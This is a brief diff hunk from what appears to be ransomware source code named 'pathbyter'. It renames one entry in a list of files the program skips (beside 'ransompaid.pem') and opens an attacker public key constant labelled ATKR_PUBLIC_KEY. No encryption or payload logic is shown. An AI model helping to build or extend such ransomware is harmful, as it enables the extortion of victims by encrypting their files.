@@ -21,7 +21,7 @@ pathbyter = "50 61 74 68 62 79 74 65 72"
 IGNORE_FILES = ['private.pem', 
                 'ransompaid.pem', 
                 'speedtest.py', 
-                'helloworldgenerator.py',
+                'testfilegenerator.py',
                 'donotdelete.json']
 
 ATKR_PUBLIC_KEY = """MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAxOiq056Sy3TAIfxNB8t+
